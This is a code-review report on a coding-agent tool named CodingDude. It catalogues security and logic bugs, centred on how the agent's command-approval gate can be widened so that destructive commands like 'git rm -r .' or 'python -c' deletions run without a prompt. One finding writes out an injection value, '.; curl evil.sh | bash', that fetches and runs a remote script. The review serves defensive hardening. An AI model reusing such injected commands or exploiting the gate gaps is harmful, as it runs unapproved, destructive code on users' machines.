# CodingDude Self-Review — Issues & Improvements

Scope: full re-review of the current source (`src/codingdude/**`, `tests/**`,
`frontend/src/**`, `bench.py`, config/CI) after the session-isolation surgery
(commits `b049b29`, `8b0bb60` and predecessors).
Method: static inspection grounded in the code via **codegraph** (symbol/caller
lookups) and cross-checked against the spec (`.scratch/codingdude/spec.md`),
the issue files, and ADRs (`docs/adr/`, esp. 0003/0004). Unlike the previous
pass, the toolchain was actually executed in this environment:

- `uv run ruff check .` → **All checks passed**
- `uv run mypy` → **Success: no issues found in 26 source files**
- `uv run pytest -q` → **131 passed, 5 warnings** (duration varies: 36-62s depending on cache warmth)

So every finding below is a *logic/design* issue, not a lint or type error.

Severity legend:

## Status addendum — reconciled against HEAD (`90b882d` + this session)

The vast majority of this review has since been fixed and verified in code
(this session, commit pending). Verified fixed:

- **C1** — `_resolve_gate()` and the engine both persist via `policy.pattern_for()` now (`tools.py:219`, `engine.py:195`).
- **H1** — shell/git/coverage/ask_user toolsets are attached only when `approvals is not None` (`plugins/__init__.py`).
- **H2** — worker forwards `fix_loop` (`worker.py:263`).
- **H3** — `run_coverage` builds an argv list and rejects absolute/`..` sources (`tools.py:419`).
- **H4** — `load_project_config` accepts top-level string and both table shapes (`config.py:168`).
- **H5** — worker resolves `config.models.vision` and passes `vision_model` (`worker.py:130`).
- **H6** — usage recorded for compaction, extraction, claims retry via `_record_model_usage` (`engine.py`).
- **H7** — all runs drive `agent.iter` with incremental `persist` on every CallToolsNode (`engine.py:693`, `:728`).
- **H8** — `deadcode._iter_source_files` containment check raises `ModelRetry` on escape.
- **H9** — string model overrides resolved (`engine.py:309`).
- **M11 (partial)** — knip/ci/audit/repo_map toolsets now attached. `refactor` and `worktree` toolsets remain deliberately orphaned pending a gating decision (known open item).
- **M12, M13** — frontend revert index and duplicate skill handlers fixed.
- **M14** — `.ts`/`.tsx` parse via the TypeScript grammar (`jslang.py`).
- **L13 (MCP temp file)** — stable sha256-digest temp name.

Fixed this session:

- **M7 (residual)** — the MCP setup `try/except` in `plugins/__init__.py` swallowed *all* failures silently (`except Exception: pass`). Now logs a warning; runs still degrade instead of dying.
- **New: Windows process-list parsing** — `restart._ps_processes` crashed with `JSONDecodeError` when any process on the host had a control character in its command line; now `json.loads(out, strict=False)` + regression via the existing restart tests.

Still open (tracked, not forgotten): **M11 remainder** (gate or attach `refactor`/`worktree` toolsets), **L1** (`Engine.run()` decomposition), **M6** (migration ladder), **M3/M4/M5** (hardening), frontend **L11/L13** polish items, and the harness-blocked **R1 vision half**.

---

- **Critical** — approval/security bypass, path escape, or cross-project leak.
- **High** — broken feature, wrong result, or latent correctness/safety bug in a shipped path.
- **Medium** — real bug or fragility with narrower impact.
- **Low / Improvement** — cleanup, maintainability, or hardening.

---

## Summary

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 9 |
| Medium | 14 |
| Low / Improvement | 13 |

### Fixed since the last review (verified in the code, keep it that way)

- **Old C1** — `find` removed from `AUTO_SHELL`; `find … -delete/-exec/-ok` now in `ALWAYS_GATED`. ✔
- **Old C3** — fix-loop pre-approves the *exact* `test_command`, never `python`/`node`. ✔ (but the loop itself is now dead from the UI — see **H2**)
- **Old C4** — AST tools route through `_resolve_contained()`; escapes raise `ModelRetry`. ✔
- **Old C5** — `embeddings` gained a `workdir` column, PK `(path, workdir)`, `search()` filters by it, plus an in-place migration dropping the legacy table. ✔
- **Old H5** — JS/TS dead-code walk now recurses into function bodies and skips only the def-name node by byte range. ✔
- **Old M1** — `tools.resolve()` now resolves the target before the containment check (partial — see **M1** below).
- **Old M3** — `OUTSIDE_WORKDIR` Windows-tilde branch fixed to `~[\\/]`. ✔

---

## Critical

### C1. Pattern Approval persists only the *leading token*, and the multi-token fix is bypassed by the code path that actually saves it

- **Where:** `src/codingdude/tools.py` `_resolve_gate()` (line ~189); `src/codingdude/approvals.py` `pattern_for()` (line ~89); persistence wired in `src/codingdude/engine.py` (`approvals.on_pattern = lambda pattern: self._db.record_pattern_approval(session_id, pattern)`, line ~305).
- **Problem:** The "C2 fix" added a multi-token `pattern_for()` (so approving `npm test` should yield the family `npm test`), and `Engine.approve_pattern()` uses it. **But the code that actually records the session pattern does not.** `_resolve_gate()` does:

  ```python
  pattern = command.strip().split()[0]      # <- the bare leading token
  policy.approve_pattern(pattern)
  if policy.on_pattern:
      policy.on_pattern(pattern)            # <- persisted to the DB as-is
  ```

  `_resolve_gate()` is the single gate path used by **all three gated toolsets** — `shell`, git's `_gate()` (`git commit`, `git branch`), and `run_coverage` (confirmed via codegraph: 3 callers). So an "Approve all matching" on any command persists its leading binary for the whole session.
- **Impact:** The always-gated regex is the *only* remaining backstop, and it is an enumerated deny-list, not a category. Concretely:
  - Approve `run_coverage` once (its command is `python -m pytest --cov=…`; `python` isn't in the multi-token list) → pattern **`python`** is persisted → for the rest of the session, `shell("python -c \"import shutil; shutil.rmtree(...)\"")` decides **APPROVED** with no gate. This is old **C3 resurrected through a different door**, and it survives into *subsequent* runs because the pattern is written to the `approvals` table.
  - Approve `git commit` → pattern **`git`** → `git rm -r .` (not in `ALWAYS_GATED`) is **APPROVED**. `git rm` deletes files.
  - Approve `npm test` via the worker → **two** rows are written: the worker's `engine.approve_pattern()` writes `npm test` (multi-token) *and* `on_pattern` writes `npm` — so the broad token wins anyway.
- **Why the existing tests don't catch it:** `tests/test_interactive_approvals.py::test_ask_pattern_persists_for_future_runs` asserts `session_patterns == ['printf']` — i.e. it *encodes the leading-token behaviour as the contract*. The suite locks in the bug.
- **Fix:** Make the persisted pattern come from `policy.pattern_for(command)` in **one** place, and add an explicit interpreter/deny rule so `pattern_for` never returns `python`, `python3`, `node`, `bash`, `sh`, `pwsh`, `powershell`, `ruby`, `perl`, `osascript`, `cmd`, or a bare `git`/`npm`/`pip` when the sub-command is itself a mutation. Belt-and-braces: for interpreter binaries, require the *exact* command as the pattern (as old C3 did for the fix loop). Update the test above to assert the multi-token family.

---

## High

### H1. Git and coverage toolsets are attached even when `approvals is None`, then crash on gated calls

- **Where:** `src/codingdude/engine.py` (`run`, lines ~316-318).
  ```python
  from .tools import build_coverage_toolset, build_git_toolset
  toolsets.append(build_git_toolset(workdir, approvals))       # unconditional
  toolsets.append(build_coverage_toolset(workdir, approvals))  # unconditional
  ```
- **Problem:** When `engine.run()` is called without an `ApprovalPolicy` (the documented default signature, and the path used by several tests, e.g. `test_default_run_has_no_shell_tool`), `git_commit`, `git_branch`, `git_push`, `gh_pr_create`, `gh_pr_view` and `run_coverage` are still advertised to the model. Their `_gate()`/`decide()` helpers call `policy.decide(...)` on `None` → `AttributeError: 'NoneType' object has no attribute 'decide'`. Read-only git tools happen to work, which hides this in smoke tests.
- **Impact:** A model that calls `git_commit` in a policy-less run crashes the run instead of being told the tool is unavailable.
- **Fix:** Attach git/coverage only inside the `if approvals is not None:` block (matching how the shell toolset is already gated), or make `_gate`/`run_coverage` treat `None` as `GateRequired` explicitly.

### H2. The "fix until green" toggle is a no-op from the web UI

- **Where:** `src/codingdude/worker.py` (`run` → `runner()`, the `engine.run(...)` call, ~line 160); arg declared at ~line 78 (`--fix-loop`).
- **Problem:** The server forwards `--fix-loop` (`server.py:246`) and the worker *parses* it (`args.fix_loop`), but `runner()` never passes `fix_loop=` to `engine.run()`. Grep confirms `fix_loop` appears in `cli.py` and `engine.py` but **nowhere in `worker.py`'s run call**.
- **Impact:** The UI checkbox ("fix until green") is silently ignored; only the headless CLI path actually runs the loop. A user-visible feature is dead on the primary interface.
- **Fix:** Pass `fix_loop=args.fix_loop` (and `test_command` when the UI gains one) to `engine.run()`.
- **Test gap:** `tests/test_fix_loop.py` exercises the engine directly, so the worker wiring is untested.

### H3. `run_coverage` interpolates model-supplied `source` into a `bash -c` string

- **Where:** `src/codingdude/tools.py` `build_coverage_toolset.run_coverage()` (line ~380).
  ```python
  command = f'python -m pytest --cov={source} --cov-report=term-missing -q'
  ... asyncio.create_subprocess_exec('bash', '-c', command, ...)
  ```
- **Problem:** `source` comes straight from the model. `source = ".; curl evil.sh | bash"` produces a compound shell command. The gate shows the composed string, but a user pattern-approving coverage (or `--yolo`) runs it verbatim. It also always uses `bash`, ignoring `shell.default` on PowerShell-only Windows hosts.
- **Impact:** Command injection inside a "gated" tool; broken on Windows.
- **Fix:** Build an `argv` list (`['python','-m','pytest',f'--cov={source}',...]`), validate `source` is a relative path inside the Workdir, and honour the configured shell.

### H4. Per-project `.codingdude.toml` shell override never applies for the documented format

- **Where:** `src/codingdude/config.py` `load_project_config()` (lines ~148-154).
  ```python
  if 'shell' in raw.get('shell', {}):
      out['shell'] = raw['shell']['shell']
  ```
- **Problem:** The documented format (issue `04`: "Per-project `.codingdude.toml` (`shell = "powershell")`") is a **top-level string**. With that file, `raw.get('shell', {})` returns the string `"powershell"`, and `'shell' in "powershell"` is `False` → returns `{}`. With the global-config shape `[shell]\ndefault = "powershell"` it also returns `{}`. The only shape that works is the undocumented `[shell]\nshell = "..."`.
- **Impact:** Spec story 8 ("shell configurable per project") silently does nothing; a Windows user who sets PowerShell keeps getting Git Bash.
- **Fix:** Accept `shell = "..."` (top-level string), `[shell] default = "..."`, and `[shell] shell = "..."`, returning the value consistently. Add a test for the documented shape.

### H5. Image / vision input is non-functional end-to-end

- **Where:** `src/codingdude/engine.py` (`run`: `if image_path is not None and vision_model is not None: resolved = vision_model`, line ~263; media type line ~435), `src/codingdude/worker.py` (`image_path` passed, never `vision_model`), `src/codingdude/server.py` (`start_run`, always writes the upload as `….png`, line ~254), `src/codingdude/config.py` (`ModelLineup.vision` — **zero readers**, confirmed by grep).
- **Problem:** `engine.run()` only switches to a vision model when **both** `image_path` and `vision_model` are supplied; no caller ever supplies `vision_model`, and `models.vision` is never resolved. So image bytes are handed to the text model (`deepseek-v4-pro`). The server also hardcodes `.png`, so a JPEG is stored and labelled PNG, and `engine`'s suffix sniff (`endswith('.png')`) then always says `image/png`.
- **Impact:** The screenshot/image feature fails or sends pixels to a text-only model; media type is wrong for every non-PNG upload.
- **Fix:** Resolve `vision_model` from `config.models.vision` in the worker (or engine), pass it through, and preserve the uploaded file's real media type (carry it from the data-URL prefix instead of forcing `.png`).

### H6. Usage/budget under-counts every auxiliary model call

- **Where:** `src/codingdude/engine.py` (`run` records only the final `result.usage`, line ~505; `_maybe_compact`, `_extract_memory`, `_verify_claims`), `src/codingdude/planning.py` (`_review_impl`).
- **Problem:** Only the main run's usage is billed. Not recorded: the compaction summarizer, every fix-loop retry except the last, memory extraction, claim verification (+ its retry), plan/review passes, and subagent delegation. `_check_budget()` runs only before and after the main run, so the Budget Cap is not a hard stop *during* sub-runs.
- **Impact:** The cost meter is wrong, and the advertised "hard-stop" Budget Cap (not bypassed by `--yolo`) can be blown by large sub-run spend.
- **Fix:** Accumulate usage from every `Agent.run` into a shared per-session accumulator and re-check the budget between iterations/auxiliary calls.

### H7. Non-streaming (headless) runs do not persist history incrementally

- **Where:** `src/codingdude/engine.py` (`run`): the streaming path snapshots on each `CallToolsNode` (`persist(run.all_messages())` in `_run_streaming`), while the non-streaming path (`await agent.run(...)`) persists only at the very end (`replace_messages`, line ~460).
- **Problem:** `emit is None` selects the non-streaming path — i.e. all headless runs. A crash/stop/kill before completion loses the whole in-flight exchange.
- **Impact:** Contradicts the spec's "Session resumption covers crash recovery" (ADR-0002/0003) for exactly the unattended path where crashes are most likely.
- **Fix:** Drive every run through the streaming/iterating API (or add a message callback) so history is snapshotted after each model/tool turn regardless of frontend.

### H8. `find_dead_code` escapes the Workdir and crashes on outside paths

- **Where:** `src/codingdude/deadcode.py` `_iter_source_files()` (lines ~19-31) and `_js_dead_code()` (line ~99).
  ```python
  target = (root / path).resolve() if path else root   # no containment check
  ...
  if any(part in SKIP_DIRS for part in f.relative_to(root).parts):   # ValueError if outside
  ```
- **Problem:** This is the same containment gap as old C4, but in `deadcode.py` — and unlike `ast_tools` it was **not** fixed. `build_deadcode_toolset(workdir)` **is** attached to the engine (`engine.run`). A call like `find_dead_code(path='../..')` yields files outside the Workdir: `_vulture_python` runs vulture over them (reads outside the project), and `_js_dead_code`'s `f.relative_to(workdir)` raises an unhandled `ValueError`.
- **Impact:** Workdir-boundary violation (information disclosure) plus a tool crash — the exact class of bug the C4 fix was supposed to eliminate.
- **Fix:** Route every path through the same `_resolve_contained`/`resolve()` helper used by `ast_tools`/`tools`, returning `ModelRetry` on escape. (The same helper should back `refactor.py` and `repo_map.py` when they get attached — see M11.)

### H9. String model override is silently discarded

- **Where:** `src/codingdude/engine.py` (`run`, line ~260):
  ```python
  resolved = model if isinstance(model, Model) else self.build_model()
  ```
- **Problem:** `run(model: Model | str | None)` and `build_model(main: Model | str | None)` both advertise a string model name, but a `str` is dropped and the configured `models.main` is used instead. No error, no warning.
- **Impact:** Callers passing e.g. `model='openai:gpt-5-mini'` get the default model silently.
- **Fix:** `resolved = self.build_model(main=model) if isinstance(model, str) else (model or self.build_model())`.

---

## Medium

### M1. `tools.resolve()` compares against the unresolved Workdir

- **Where:** `src/codingdude/tools.py` `resolve()` (lines ~52-59): `target.relative_to(workdir)` where `workdir` is the raw `Path`.
- **Problem:** `target` is resolved (symlinks expanded) but `workdir` is not. If the Workdir has a symlinked parent (common for `/tmp` on macOS, or junctions on Windows), `target.relative_to(workdir)` raises `ValueError` → a spurious "outside the Workdir" for a legitimate path. `ast_tools._resolve_contained` and `resolve_workdir_path` already do this correctly.
- **Fix:** `target.relative_to(workdir.resolve())`.

### M2. `glob` bypasses the shared containment check

- **Where:** `src/codingdude/tools.py` `glob()` (line ~100): `workdir.glob(pattern)` directly.
- **Problem:** It's the one file tool not routed through `resolve()`. Behaviour with `..`/absolute patterns varies by pathlib version; an escape attempt isn't refused cleanly.
- **Fix:** Normalize the pattern/root through the same containment-checked resolver and refuse escapes.

### M3. `OUTSIDE_WORKDIR` heuristic is weak and case-sensitive

- **Where:** `src/codingdude/approvals.py` (line ~44).
- **Problem:** No `re.IGNORECASE`, so drive-letter paths and some tilde inputs slip; the Unix branch only matches `/(home|Users|etc|var|tmp)/`. It is best-effort by design (ADR-0004), but **C1** shows the always-gated tier leaning on it.
- **Fix:** Compile with `re.IGNORECASE` and broaden the absolute-path branch, or resolve-and-compare the first path-like token against the Workdir.

### M4. Server bearer token is exposed in worker process arguments

- **Where:** `src/codingdude/server.py` `start_run()` (~line 225): the token is embedded in `--server ws://…?token=…`.
- **Problem:** Visible in `ps`/Process Explorer to any other local user. `--prompt` is also passed on the argv, which can exceed Windows' ~32 KB command-line limit for large prompts.
- **Fix:** Pass the token (and the prompt) via environment variables or a stdin handshake instead of argv.

### M5. `run_ws` allows `testclient` regardless of `allow_testclient`

- **Where:** `src/codingdude/server.py` `run_ws()` (line ~569): `host not in ('127.0.0.1', '::1', 'testclient')`.
- **Problem:** `authorize`, `run_events`, and `_local_browser` all conditionally allow `testclient`; the WebSocket path hardcodes it. Inconsistent auth policy with a standing test-only bypass.
- **Fix:** Use the same `('127.0.0.1', '::1') + (('testclient',) if allow_testclient else ())` tuple.

### M6. `delete_session` orphans `plans` rows; no general migration path

- **Where:** `src/codingdude/db.py` `delete_session()` (line ~179) — deletes `messages`, `approvals`, `usage` but **not** `plans`. Schema uses only `CREATE TABLE IF NOT EXISTS`; the only migration is the special-cased `embeddings` drop.
- **Impact:** Orphaned plan rows; future schema changes (columns/constraints) have no upgrade path for existing DBs, which will silently diverge from `_SCHEMA`.
- **Fix:** Delete or cascade all child tables, and introduce a `PRAGMA user_version`-based migration ladder.

### M7. MCP config failures crash the whole run

- **Where:** `src/codingdude/mcp_config.py` `_load_config_file()` (`json.loads` raises), `load_merged_mcp_toolsets()`; called from `engine.run` inside the try that only cleans up the husk session and re-raises.
- **Impact:** One malformed `mcp.json` (global or project) prevents every run.
- **Fix:** Catch and warn (disable the offending server) so MCP config can never brick the engine.

### M8. A globally disabled MCP server cannot be re-enabled per project

- **Where:** `src/codingdude/mcp_config.py` `merged_mcp_config()` (union of disabled lists) and `set_mcp_disabled()`.
- **Problem:** Disabled is modelled as a union, so a globally disabled server stays disabled even if the project enables it; the UI's "enable" writes the project file and *appears* to work.
- **Fix:** Model enable/disable as a per-server override where the project value wins.

### M9. Claim-verification retry is never persisted

- **Where:** `src/codingdude/engine.py` `_verify_claims()` (~line 661).
- **Problem:** The retry agent's messages/tool results are used only to emit `CLAIMS_ADDRESSED`; they aren't written back to the session, and the original `result.output` is returned. If the retry actually runs commands or edits files, that exchange is missing from history.
- **Fix:** Persist the retry messages through the normal path and return the corrected output when appropriate. Also note: `_verify_claims` returns immediately when `_extraction_model is None`, so **headless runs never do claim verification at all** — worth documenting or resolving the auditor model in the CLI too.

### M10. Shell/coverage/fix-loop hardcode `bash` on Windows

- **Where:** `src/codingdude/tools.py` `run_coverage` (`bash -c`), `src/codingdude/engine.py` fix-loop test run (`bash -c`), `src/codingdude/tools.py` `find_unused_exports` (`create_subprocess_shell`).
- **Problem:** They ignore the configured `shell.default`, which `build_shell_toolset` otherwise honours.
- **Fix:** Route every subprocess through one shell-resolution helper.

### M11. Several implemented toolsets are never attached to the agent

- **Where:** `src/codingdude/engine.py` (toolset assembly).
- **Problem (confirmed via codegraph — these builders have no caller outside their own module + tests):**
  - `build_worktree_toolset` (`worktrees.py`)
  - `build_knip_toolset`, `build_ci_toolset`, `build_audit_toolset` (`tools.py`)
  - `build_repo_map_toolset` (`repo_map.py`)
  - `build_refactor_toolset` (`refactor.py`)
- **Impact:** Features documented as shipped (dependency audit, worktree isolation, rename/refactor, unused-exports) are unreachable from real runs; the tool surface is inconsistent and untestable as a whole.
- **Fix:** Build one toolset registry and attach every intended toolset (or explicitly deprecate/remove the orphans). Attaching `refactor`/`repo_map` also requires giving them the containment fix from H8/M1.

### M12. Frontend: Chat Revert passes the wrong index

- **Where:** `frontend/src/App.jsx` `Chat()` (line ~753): `onRevert={() => onEditRevert(i, ed)}` inside `m.edits.map((ed, i) => …)`, which shadows the outer `messages.map((m, i) => …)` index. `App.onEditRevert(msgIndex, edit)` (line ~1173) then filters edits on the *wrong* message.
- **Impact:** Reverting an edit removes the block from the wrong message (or nothing); the file is still restored via the PUT, so the UI state drifts from disk.
- **Fix:** Rename the inner variable and pass the outer message index.

### M13. Frontend: duplicated `editSkill`/`saveSkill`/`deleteSkill` referencing an undefined setter

- **Where:** `frontend/src/App.jsx` `RightPanel()` — a first set at ~lines 452-483 and a shadowing second set at ~527-546.
- **Problem:** The first `saveSkill` calls `setSkillSaved(...)` (never defined — the real one is `setSavedMsg`), and `editSkill` is dead (the UI uses `startEditSkill`). The duplicates are hoisted, so the later `saveSkill`/`deleteSkill` win; the dead first set would throw a `ReferenceError` if the shadowing ones were removed.
- **Fix:** Delete the first set; keep one implementation and the correct setter.

### M14. TypeScript support is declared but unused; TS files are parsed with the JS grammar

- **Where:** `pyproject.toml` (`tree-sitter-typescript`), `repo_map.py`, `deadcode.py`, `refactor.py` (all import only `tree_sitter_javascript`).
- **Problem:** `.ts`/`.tsx` files are parsed with the JavaScript grammar, so TS-only syntax (types, interfaces, generics, decorators) can mis-parse and yield wrong dead-code/rename/signature results. The typescript grammar has zero readers.
- **Fix:** Use the TypeScript grammar for `.ts`/`.tsx`, or drop the dependency.

---

## Low / Improvement

### L1. `Engine.run()` is a god-method
~250 lines with ~34 deferred imports handling session creation, model resolution, instruction assembly, compaction, toolset wiring, streaming dispatch, fix-loop, usage, memory extraction, and claim verification. Split into prepare/assemble/execute/post-process over a `RunContext`.

### L2. `_run_streaming` depends on pydantic-ai private internals
`from pydantic_ai._agent_graph import CallToolsNode` is a private API and will break on upgrades. Prefer the public iteration/event API or its UI adapter.

### L3. `scrubbed_env()` markers are overbroad; `SYSTEMROOT` clause is redundant
`SECRET_MARKERS = ('KEY','TOKEN',…)` strips any var whose *name contains* `KEY`/`TOKEN` (including harmless ones), and `SYSTEMROOT` is already kept by the first condition. Prefer an exact-name/allowlist (ADR-0004 already lists this as future work).

### L4. `load_config()` crashes on malformed `config.toml`
`TOMLDecodeError` propagates and the CLI dies with a traceback instead of falling back to defaults with a warning.

### L5. `rewind_to` leaves later checkpoints listed
It creates a safety checkpoint and restores the target, but the later checkpoints remain, which is confusing for "undo all later checkpoints."

### L6. `refactor._js_replace` renames every identifier, including properties/keys
The JS rename path replaces all `identifier` nodes named `old` — including `obj.old` property accesses and object-literal keys. Reuse the definition/reference analysis already in `deadcode.py`.

### L7. `semantic.cosine()` returns a dot product, not cosine similarity
No normalization; correct only while the embedder emits unit vectors (`FakeEmbedder` does). A provider returning unnormalized embeddings will rank wrongly.

### L8. `SkillRegistry._scan` silently ignores non-JSON frontmatter
Only `json.loads(raw[:body_start])` before the first blank line is handled; the common `---\nname: …\n---` style is skipped without a warning. Support YAML or document/detect the format.

### L9. `cli.main` no-op
`if args.fix_loop: args.fix_loop = True` (lines ~96-97) does nothing.

### L10. `tests/helpers.py` duplicate `return`
`scripted()` ends with the same `return FunctionModel(...)` twice; the second is unreachable.

### L11. Frontend history reload drops tool/edit/gate/review events
`App.loadMessages()` maps only `user-prompt` and `text/response` parts, so a resumed session shows none of the tool calls, edits, gates, or review findings until a new run streams events. Derive them from stored messages or the trace.

### L12. `decide('')` / `pattern_for('')` raise `IndexError`
`stripped.split()[0]` (approvals.py ~80) and `tokens[0]` (~92) assume non-empty input. A model that passes an empty shell command crashes the gate path. Guard and return `NEEDS_GATE`/a safe default.

### L13. Assorted smaller ones
- **MCP temp-file leak:** `load_merged_mcp_toolsets` names its temp file from `abs(hash(...))`; Python's `hash` is per-process randomized, so files accumulate across runs. Clean up or use a stable name + PID.
- **`engine.INSTRUCTIONS = _base_instructions()`** runs a filesystem read at import time (module-import side effect); make it lazy.
- **`_diff_nonempty` / `_verify_claims` sit outside `run()`'s try/except** and shell out to `git`; a missing `git` on PATH raises `FileNotFoundError` *after* a successful completion, discarding the outcome. Guard it.
- **Frontend token plumbing is misleading:** the session cookie is HttpOnly, yet `api.ts` `getToken()`/`eventStreamUrl` read `localStorage['codingdude-token']` (always empty) and `deleteSkill` sends `Authorization: Bearer <empty>`. Requests only succeed via the cookie; the code implies a token exists. Remove or document.
- **Two `notify` states** (`App` and `Prompt`) both keyed to `localStorage['cd-notify']` but independent React state — toggling the bell doesn't affect `App`'s notification logic until reload. Consolidate.
- **`bench.py` mutates `CODEDUDE_HOME` mid-loop** without restoring it, and inserts `tests/` on `sys.path` at import — both leak across tasks. Use per-task isolation.
- **`planning.update_step` uses `store.latest(session_id)`**, so with multiple plans in a session a step update can target the wrong plan. Track the active plan id explicitly.
- **`semantic_search` re-embeds the whole Workdir on every call** (`index_workdir` inside the tool) and scores every row in Python (`search`). Fine for small repos; for larger ones cache the index per session and consider chunk-level embeddings.

---

## Positive notes

- The engine seam is genuinely testable and the suite is broad (131 tests: approvals, gates, planning, MCP, git, checkpoints, semantic, server/worker round-trip, passwordless auth).
- The **fixed** items are done well: the embeddings `workdir` migration is a clean in-place upgrade; `_read_meta`'s torn-write tolerance; the single-writer worker WebSocket (frame interleaving); `resolve_workdir_path` as the containment template; the always-gated tier surviving patterns; Budget Cap surviving `--yolo`.
- `_mask_workdir` (shell self-reference masking) is a thoughtful fix for a subtle false-positive, and its test even checks the negative case.
- ruff + mypy + CI (ruff/mypy/pytest/scripted-bench on `windows-latest`) are green.

---

## Suggested fix priority

1. **C1** — collapse pattern persistence onto one `pattern_for()` path and add an interpreter/deny rule (closes a real un-gated `python -c` path). Update the test that encodes the bug.
2. **H1, H2, H3, H5** — gated-tool `None` crash, dead UI fix-loop, coverage injection, image/vision wiring.
3. **H4, H8** — project shell config parsing, `find_dead_code` containment.
4. **H6, H7, H9** — usage/budget accounting, incremental persistence, string model override.
5. **M-list** (esp. M6 migrations, M7/M8 MCP robustness, M11 orphan toolsets, M12/M13 frontend), then the Low cleanups.

## Test gaps to close alongside the fixes

- Negative case for **C1**: approving an interpreter/`npm`/`git` command must not unlock a sibling mutation in-session.
- Worker-path test for **H2** (fix-loop forwarded) and **H5** (vision model resolved).
- Documented-shape test for **H4** (`shell = "powershell"`).
- Containment tests for **H8** (`find_dead_code(path='..')`).
- A sub-run usage/budget test for **H6**.
